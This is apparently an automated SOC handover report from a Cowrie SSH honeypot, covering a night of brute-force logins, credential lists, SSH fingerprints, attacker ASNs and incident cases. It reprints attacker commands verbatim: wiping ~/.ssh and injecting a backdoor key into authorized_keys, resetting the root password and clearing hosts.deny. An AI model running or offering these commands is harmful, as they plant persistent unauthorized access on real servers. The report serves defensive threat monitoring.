# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-05 |
| **Generated At** | 2026-04-05T22:29:41Z |
| **Shift Time** | 22:29 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **93** |
| Confirmed Threats | **61** |
| False Positives Filtered | **32** (34.4%) |
| Unique Attacker IPs | **16** |
| Countries of Origin | **7** |
| High Severity Cases | **32** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **61** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **56** |
| Unique Credential Pairs | **31** |
| Unique Usernames | **11** |
| Unique Passwords | **31** |
| Successful Auth Pairs | **24** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 33 |
| `345gs5662d34` | 13 |
| `odoo` | 2 |
| `deploy` | 1 |
| `taher` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 13 |
| `345gs5662d34` | 13 |
| `QQdd000` | 2 |
| `Odoo31` | 1 |
| `frappe03!` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 13 |
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `QQdd000` | 2 |
| `odoo` | `Odoo31` | 1 |
| `deploy` | `frappe03!` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-04-05T20:30:07 |
| `root` | `root1234567!@` | `74.91.224.229` | 2026-04-05T20:32:52 |
| `root` | `3245gs5662d34` | `74.91.224.229` | 2026-04-05T20:32:55 |
| `root` | `QwerQwer1` | `74.91.224.229` | 2026-04-05T20:37:38 |
| `root` | `123456789@` | `74.91.224.229` | 2026-04-05T20:39:56 |
| `root` | `Root11111111!@` | `104.208.108.166` | 2026-04-05T20:41:49 |
| `root` | `3245gs5662d34` | `104.208.108.166` | 2026-04-05T20:41:52 |
| `root` | `!@#$QWER1234qwer` | `74.91.224.229` | 2026-04-05T20:42:20 |
| `root` | `Qwerty.` | `74.91.224.229` | 2026-04-05T20:44:41 |
| `root` | `Cheese123` | `74.91.224.229` | 2026-04-05T20:51:33 |
| `root` | `Asdf!@` | `74.91.224.229` | 2026-04-05T20:53:50 |
| `root` | `PASSWORD` | `74.91.224.229` | 2026-04-05T20:56:13 |
| `root` | `123456qwe@` | `74.91.224.229` | 2026-04-05T20:58:32 |
| `root` | `admin` | `112.118.57.75` | 2026-04-05T21:33:12 |
| `root` | `QQdd000` | `118.193.33.3` | 2026-04-05T21:35:10 |
| `root` | `3245gs5662d34` | `118.193.33.3` | 2026-04-05T21:35:13 |
| `root` | `woaini123.` | `113.45.150.82` | 2026-04-05T21:55:23 |
| `root` | `QQdd000` | `113.45.150.82` | 2026-04-05T21:58:40 |
| `root` | `123445` | `113.45.150.82` | 2026-04-05T22:07:02 |
| `root` | `zaq!@#123` | `113.45.150.82` | 2026-04-05T22:16:41 |
| `root` | `12332100` | `113.45.150.82` | 2026-04-05T22:20:00 |
| `root` | `qwerty!12345` | `113.45.150.82` | 2026-04-05T22:21:41 |
| `root` | `Aa.147258` | `185.39.204.145` | 2026-04-05T22:28:32 |
| `root` | `3245gs5662d34` | `185.39.204.145` | 2026-04-05T22:28:36 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **93** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 86 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 83 | 9 |
| `713bd9cc9355...` | Mirai/variant | 1 | 1 |
| `f45fb203c310...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 83 | 9 | Modern SSH client |
| `713bd9cc9355...` | libssh | 1 | 1 | Mirai/variant |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:wOFZrZ4z1bqC"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `113.45.150.82`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `118.193.33.3`, `74.91.224.229`, `104.208.108.166`, `185.39.204.145`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **16** |
| Unique ASNs | **12** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS4760` | HKT Limited | 1 | HIGH |
| `AS29465` | MTN NIGERIA Communication limited | 1 | HIGH |
| `AS31898` | Oracle Corporation | 1 | HIGH |
| `AS852` | TELUS Communications Inc. | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (32)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-65319a85a4ff

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:30 |
| **Last Seen** | 2026-04-05 20:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:30:07` | `cowrie.login.success` |
| `2026-04-05 20:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81e8845055ce

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:32 |
| **Last Seen** | 2026-04-05 20:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:32:52` | `cowrie.session.connect` |
| `2026-04-05 20:32:52` | `cowrie.client.version` |
| `2026-04-05 20:32:52` | `cowrie.client.kex` |
| `2026-04-05 20:32:52` | `cowrie.login.success` |
| `2026-04-05 20:32:52` | `cowrie.session.params` |
| `2026-04-05 20:32:52` | `cowrie.command.input` |
| `2026-04-05 20:32:52` | `cowrie.command.failed` |
| `2026-04-05 20:32:52` | `cowrie.log.closed` |
| `2026-04-05 20:32:53` | `cowrie.session.params` |
| `2026-04-05 20:32:53` | `cowrie.command.input` |
| `2026-04-05 20:32:53` | `cowrie.session.file_download` |
| `2026-04-05 20:32:53` | `cowrie.log.closed` |
| `2026-04-05 20:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bad2496f1669

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:32 |
| **Last Seen** | 2026-04-05 20:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:32:54` | `cowrie.session.connect` |
| `2026-04-05 20:32:54` | `cowrie.client.version` |
| `2026-04-05 20:32:54` | `cowrie.client.kex` |
| `2026-04-05 20:32:55` | `cowrie.login.success` |
| `2026-04-05 20:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0cf0d10058f

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:37 |
| **Last Seen** | 2026-04-05 20:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:37:38` | `cowrie.session.connect` |
| `2026-04-05 20:37:38` | `cowrie.client.version` |
| `2026-04-05 20:37:38` | `cowrie.client.kex` |
| `2026-04-05 20:37:38` | `cowrie.login.success` |
| `2026-04-05 20:37:39` | `cowrie.session.params` |
| `2026-04-05 20:37:39` | `cowrie.command.input` |
| `2026-04-05 20:37:39` | `cowrie.command.failed` |
| `2026-04-05 20:37:39` | `cowrie.log.closed` |
| `2026-04-05 20:37:39` | `cowrie.session.params` |
| `2026-04-05 20:37:39` | `cowrie.command.input` |
| `2026-04-05 20:37:39` | `cowrie.session.file_download` |
| `2026-04-05 20:37:39` | `cowrie.log.closed` |
| `2026-04-05 20:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02ca4017de20

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:37 |
| **Last Seen** | 2026-04-05 20:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:37:40` | `cowrie.session.connect` |
| `2026-04-05 20:37:40` | `cowrie.client.version` |
| `2026-04-05 20:37:40` | `cowrie.client.kex` |
| `2026-04-05 20:37:41` | `cowrie.login.success` |
| `2026-04-05 20:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38164b555052

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:39 |
| **Last Seen** | 2026-04-05 20:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:39:56` | `cowrie.session.connect` |
| `2026-04-05 20:39:56` | `cowrie.client.version` |
| `2026-04-05 20:39:56` | `cowrie.client.kex` |
| `2026-04-05 20:39:56` | `cowrie.login.success` |
| `2026-04-05 20:39:56` | `cowrie.session.params` |
| `2026-04-05 20:39:56` | `cowrie.command.input` |
| `2026-04-05 20:39:56` | `cowrie.command.failed` |
| `2026-04-05 20:39:56` | `cowrie.log.closed` |
| `2026-04-05 20:39:57` | `cowrie.session.params` |
| `2026-04-05 20:39:57` | `cowrie.command.input` |
| `2026-04-05 20:39:57` | `cowrie.session.file_download` |
| `2026-04-05 20:39:57` | `cowrie.log.closed` |
| `2026-04-05 20:39:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edeadb4a7aff

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:39 |
| **Last Seen** | 2026-04-05 20:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:39:58` | `cowrie.session.connect` |
| `2026-04-05 20:39:58` | `cowrie.client.version` |
| `2026-04-05 20:39:58` | `cowrie.client.kex` |
| `2026-04-05 20:39:59` | `cowrie.login.success` |
| `2026-04-05 20:39:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1394aa241925

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-04-05 20:41 |
| **Last Seen** | 2026-04-05 20:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:41:49` | `cowrie.session.connect` |
| `2026-04-05 20:41:49` | `cowrie.client.version` |
| `2026-04-05 20:41:49` | `cowrie.client.kex` |
| `2026-04-05 20:41:49` | `cowrie.login.success` |
| `2026-04-05 20:41:49` | `cowrie.session.params` |
| `2026-04-05 20:41:49` | `cowrie.command.input` |
| `2026-04-05 20:41:49` | `cowrie.command.failed` |
| `2026-04-05 20:41:49` | `cowrie.log.closed` |
| `2026-04-05 20:41:50` | `cowrie.session.params` |
| `2026-04-05 20:41:50` | `cowrie.command.input` |
| `2026-04-05 20:41:50` | `cowrie.session.file_download` |
| `2026-04-05 20:41:50` | `cowrie.log.closed` |
| `2026-04-05 20:41:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62b4161d071b

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-04-05 20:41 |
| **Last Seen** | 2026-04-05 20:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:41:52` | `cowrie.session.connect` |
| `2026-04-05 20:41:52` | `cowrie.client.version` |
| `2026-04-05 20:41:52` | `cowrie.client.kex` |
| `2026-04-05 20:41:52` | `cowrie.login.success` |
| `2026-04-05 20:41:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97bff2e2cb7a

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:42 |
| **Last Seen** | 2026-04-05 20:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:42:20` | `cowrie.session.connect` |
| `2026-04-05 20:42:20` | `cowrie.client.version` |
| `2026-04-05 20:42:20` | `cowrie.client.kex` |
| `2026-04-05 20:42:20` | `cowrie.login.success` |
| `2026-04-05 20:42:21` | `cowrie.session.params` |
| `2026-04-05 20:42:21` | `cowrie.command.input` |
| `2026-04-05 20:42:21` | `cowrie.command.failed` |
| `2026-04-05 20:42:21` | `cowrie.log.closed` |
| `2026-04-05 20:42:21` | `cowrie.session.params` |
| `2026-04-05 20:42:21` | `cowrie.command.input` |
| `2026-04-05 20:42:21` | `cowrie.session.file_download` |
| `2026-04-05 20:42:21` | `cowrie.log.closed` |
| `2026-04-05 20:42:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3ecad4558af

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:42 |
| **Last Seen** | 2026-04-05 20:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:42:22` | `cowrie.session.connect` |
| `2026-04-05 20:42:22` | `cowrie.client.version` |
| `2026-04-05 20:42:22` | `cowrie.client.kex` |
| `2026-04-05 20:42:23` | `cowrie.login.success` |
| `2026-04-05 20:42:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61f07e26a68a

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:44 |
| **Last Seen** | 2026-04-05 20:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:44:40` | `cowrie.session.connect` |
| `2026-04-05 20:44:40` | `cowrie.client.version` |
| `2026-04-05 20:44:41` | `cowrie.client.kex` |
| `2026-04-05 20:44:41` | `cowrie.login.success` |
| `2026-04-05 20:44:41` | `cowrie.session.params` |
| `2026-04-05 20:44:41` | `cowrie.command.input` |
| `2026-04-05 20:44:41` | `cowrie.command.failed` |
| `2026-04-05 20:44:41` | `cowrie.log.closed` |
| `2026-04-05 20:44:41` | `cowrie.session.params` |
| `2026-04-05 20:44:41` | `cowrie.command.input` |
| `2026-04-05 20:44:41` | `cowrie.session.file_download` |
| `2026-04-05 20:44:41` | `cowrie.log.closed` |
| `2026-04-05 20:44:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a970e3d78a9f

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:44 |
| **Last Seen** | 2026-04-05 20:44 |
| **Session Duration** | 0s |
